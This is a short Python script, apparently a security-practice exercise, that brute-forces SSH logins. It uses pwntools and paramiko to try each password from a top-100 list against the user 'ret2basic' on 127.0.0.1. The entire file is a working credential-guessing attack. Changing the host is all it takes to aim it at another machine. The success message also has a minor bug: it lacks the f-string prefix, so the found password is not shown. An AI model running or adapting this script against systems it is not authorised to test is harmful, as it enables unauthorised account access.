#!/usr/bin/env python3
import paramiko
from pwn import *

host = '127.0.0.1'
user = 'ret2basic'

def ssh_brute():
    """SSH login brute forcing"""

    attempts = 0

    with open('10-million-password-list-top-100.txt', 'r') as password_list:
        for password in password_list:
            password = password.strip('\n')

            try:
                print(f'[{attempts}] Attempting password: "{password}"')
                connection = ssh(host=host, user=user, password=password, timeout=1)
                if connection.connected():
                    print('[>] Valid password found: "{password}"')
                    connection.close()
                    break
                connection.close()
            except paramiko.ssh_exception.AuthenticationException:
                print('[x] Invalid password')
            
            attempts += 1
            
if __name__ == "__main__":
    ssh_brute()